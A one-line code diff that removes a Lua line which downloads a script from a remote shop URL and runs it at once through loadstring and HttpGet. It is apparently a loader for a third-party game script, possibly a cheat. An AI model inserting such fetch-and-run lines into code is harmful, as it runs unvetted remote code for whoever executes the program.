@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://purp.shop/free_version/scripts/shootfrag.lua"))()
